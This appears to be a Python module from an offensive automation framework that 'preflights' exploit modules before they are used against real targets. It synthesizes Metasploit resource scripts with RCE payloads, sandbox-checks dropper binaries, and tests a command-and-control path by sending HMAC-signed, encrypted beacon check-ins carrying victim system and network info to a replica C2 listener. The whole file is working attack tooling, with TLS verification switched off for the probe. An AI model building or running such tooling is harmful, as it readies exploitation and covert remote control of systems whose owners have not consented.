"""
preflight.py — operation-level preflight against a replica.

Two gates must pass before an exploit module touches a real target:

  1. sandbox gate — the payload/dropper binary must pass every available
     sandbox backend (existing SandboxEngine).
  2. checkin gate — the module's C2 wiring must be proven: a throwaway
     C2 listener (replica of the real infrastructure) on an ephemeral
     port accepts an encrypted beacon check-in. If the encrypted round
     trip fails here, it would fail against the real target too.

The resource script is always synthesized (never hand-typed), which also
validates the module path at plan time.
"""

from __future__ import annotations

import asyncio
import socket
from dataclasses import dataclass, field
from typing import Optional

from phantom.automation.exploit.modules import ExploitModule
from phantom.automation.runtime.msf import MsfRunner, msf_runner
from phantom.automation.sandbox.sandbox import SandboxEngine, SandboxVerdict


@dataclass
class CheckinResult:
    ok: bool
    beacon_id: str
    error: str = ""
    detail: str = ""


class CheckinProbe:
    """Drives one encrypted beacon check-in against a throwaway listener."""

    def __init__(self, host: str = "127.0.0.1",
                 use_ssl: bool = False, cert_dir: Optional[str] = None,
                 timeout: float = 10.0) -> None:
        self.host = host
        self.use_ssl = use_ssl
        self.cert_dir = cert_dir
        self.timeout = timeout

    def _ssl_context(self):
        if not self.use_ssl:
            return None
        from phantom.core.c2_server import C2Server
        return C2Server(host=self.host, use_ssl=True,
                        cert_dir=self.cert_dir)._get_ssl_context()

    def probe(self, beacon_id: str, sysinfo: str = "", netinfo: str = "",
              result_payload: str = "") -> CheckinResult:
        import json as _json
        import secrets as _secrets
        import time as _time

        from aiohttp import web
        import aiohttp
        import phantom.core.c2_server as mod
        from phantom.utils.c2_crypto import encrypt_data, decrypt_data
        from phantom.utils.beacon_auth import (
            enroll_or_get_secret, isolated_registry, sign_request)

        # The replica listener enforces beacon HMAC auth exactly like the real
        # C2. Enroll a throwaway identity in an isolated registry and sign the
        # probe requests, so this gate proves the full authenticated path
        # (enrollment -> HMAC -> encrypted round trip), not just the crypto.
        # The registry stays redirected for the whole round trip because the
        # server-side auth resolves the registry at request time.
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            with isolated_registry():
                secret = enroll_or_get_secret(beacon_id)
                if not secret:
                    return CheckinResult(
                        ok=False, beacon_id=beacon_id,
                        error="failed to enroll probe beacon identity")

                def _signed_headers(counter: int, path: str, body: str) -> dict:
                    timestamp = str(int(_time.time()))
                    nonce = _secrets.token_hex(16)
                    signature = sign_request(
                        secret, "POST", path, timestamp, str(counter), nonce, body)
                    return {
                        "X-Beacon-Id": beacon_id,
                        "X-Beacon-Timestamp": timestamp,
                        "X-Beacon-Counter": str(counter),
                        "X-Beacon-Nonce": nonce,
                        "X-Beacon-Auth": signature,
                    }

                async def run() -> CheckinResult:
                    app = web.Application()
                    app.router.add_post("/api/v1/ping", mod.handle_checkin)
                    app.router.add_post("/api/v1/result", mod.handle_result)
                    runner = web.AppRunner(app)
                    await runner.setup()
                    s = socket.socket()
                    s.bind((self.host, 0))
                    port = s.getsockname()[1]
                    s.close()
                    try:
                        ctx = self._ssl_context()
                        site = web.TCPSite(runner, self.host, port, ssl_context=ctx)
                        await site.start()
                    except Exception as e:
                        await runner.cleanup()
                        return CheckinResult(ok=False, beacon_id=beacon_id,
                                             error=f"listener setup failed: {e}")

                    ssl_ctx = None
                    scheme = "http"
                    if self.use_ssl:
                        import ssl as _ssl
                        ssl_ctx = _ssl.create_default_context()
                        ssl_ctx.check_hostname = False
                        ssl_ctx.verify_mode = _ssl.CERT_NONE
                        scheme = "https"

                    try:
                        telemetry = encrypt_data(_json.dumps({
                            "sysinfo": sysinfo, "netinfo": netinfo}))
                        async with aiohttp.ClientSession() as sess:
                            async with sess.post(
                                    f"{scheme}://{self.host}:{port}/api/v1/ping",
                                    data=telemetry,
                                    headers=_signed_headers(1, "/api/v1/ping", telemetry),
                                    ssl=ssl_ctx) as resp:
                                if resp.status != 200:
                                    return CheckinResult(
                                        ok=False, beacon_id=beacon_id,
                                        error=f"checkin http {resp.status}")
                                body = await resp.text()
                                decrypted = decrypt_data(body)
                                if "tasks" not in decrypted:
                                    return CheckinResult(
                                        ok=False, beacon_id=beacon_id,
                                        error="decrypted response lacks tasks list")
                            if result_payload:
                                result_body = encrypt_data(_json.dumps({
                                    "task_id": "preflight", "output": result_payload}))
                                async with sess.post(
                                        f"{scheme}://{self.host}:{port}/api/v1/result",
                                        data=result_body,
                                        headers=_signed_headers(2, "/api/v1/result", result_body),
                                        ssl=ssl_ctx) as resp:
                                    if resp.status != 200:
                                        return CheckinResult(
                                            ok=False, beacon_id=beacon_id,
                                            error=f"result http {resp.status}")
                        return CheckinResult(ok=True, beacon_id=beacon_id,
                                             detail=f"check-in verified on {self.host}:{port}")
                    except Exception as e:
                        return CheckinResult(ok=False, beacon_id=beacon_id, error=str(e))
                    finally:
                        await runner.cleanup()

                return loop.run_until_complete(run())
        finally:
            loop.close()


@dataclass
class PreflightReport:
    module: dict
    target_host: str
    target_port: int
    sandbox: SandboxVerdict = field(default_factory=lambda: SandboxVerdict(approved=True))
    checkin: Optional[CheckinResult] = None
    script_path: str = ""
    approved: bool = False
    reason: str = ""

    def summary(self) -> str:
        parts = []
        parts.append(f"module {self.module.get('cve')} -> {self.target_host}:{self.target_port}")
        parts.append(f"script: {self.script_path or 'not synthesized'}")
        parts.append(f"sandbox: {self.sandbox.summary()}")
        if self.checkin is not None:
            if self.checkin.ok:
                parts.append(f"checkin: OK ({self.checkin.detail})")
            else:
                parts.append(f"checkin: FAILED ({self.checkin.error})")
        parts.append("APPROVED" if self.approved else f"DENIED: {self.reason}")
        return " | ".join(parts)


class PreflightEngine:
    """Runs the two gates for an ExploitModule."""

    def __init__(self, sandbox: Optional[SandboxEngine] = None,
                 runner: Optional[MsfRunner] = None) -> None:
        self.sandbox = sandbox or SandboxEngine()
        self.runner = runner or msf_runner

    def preflight_module(self, module: ExploitModule, rhost: str, rport: int,
                         payload_path: Optional[str] = None,
                         lhost: str = "127.0.0.1", lport: int = 4444,
                         use_ssl: bool = False,
                         cert_dir: Optional[str] = None,
                         require_checkin: bool = True) -> PreflightReport:
        info = module.to_dict()
        report = PreflightReport(module=info, target_host=rhost, target_port=rport)

        # gate 0: synthesize the resource script (validates the module path)
        payload = module.payloads.get("linux") if module.kind == "rce" else ""
        try:
            report.script_path = self.runner.exploit_resource_script(
                module.msf_module, payload, rhost, rport, lhost, lport)
        except Exception as e:
            report.reason = f"resource script synthesis failed: {e}"
            return report

        # gate 1: sandbox on the payload binary (skip when none provided)
        if payload_path:
            report.sandbox = self.sandbox.preflight(payload_path)

        # gate 2: check-in against the throwaway C2 (RCE modules only)
        needs_checkin = require_checkin and module.kind == "rce"
        if needs_checkin:
            beacon_id = f"preflight-{module.cve_id.replace('-', '').lower()}"
            probe = CheckinProbe(host=lhost, use_ssl=use_ssl, cert_dir=cert_dir)
            report.checkin = probe.probe(
                beacon_id=beacon_id,
                sysinfo=f"OS: Preflight replica\nUser: root\nArch: x64\nHost: replica",
                netinfo=f"IP: {lhost}",
                result_payload=f"PREFLIGHT_OK {module.cve_id}")

        sandbox_ok = report.sandbox.approved  # skipped counts as ok
        checkin_ok = not needs_checkin or (report.checkin is not None
                                           and report.checkin.ok)
        report.approved = bool(sandbox_ok and checkin_ok)
        if not report.approved:
            if not sandbox_ok:
                report.reason = "sandbox denied: " + report.sandbox.reason
            else:
                report.reason = "checkin failed: " + (report.checkin.error if report.checkin else "probe missing")
        return report
